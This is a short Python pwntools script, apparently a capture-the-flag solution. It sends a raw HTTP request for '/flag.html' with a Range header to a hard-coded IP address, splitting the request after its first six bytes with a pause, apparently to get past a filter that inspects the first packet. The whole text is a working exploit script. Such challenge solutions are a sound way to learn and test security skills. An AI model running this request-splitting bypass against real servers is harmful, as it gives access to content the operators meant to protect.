from pwn import *

host = "35.227.38.232"
#host = "127.0.0.1"
path = "/flag.html"
req = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Connection: close\r\n"
    "Range: bytes=134-\r\n"
    "\r\n"
).encode("ascii")
r = remote(host, 5000)
r.send(req[:6])
sleep(0.1)
r.send(req[6:])
print(r.recvall())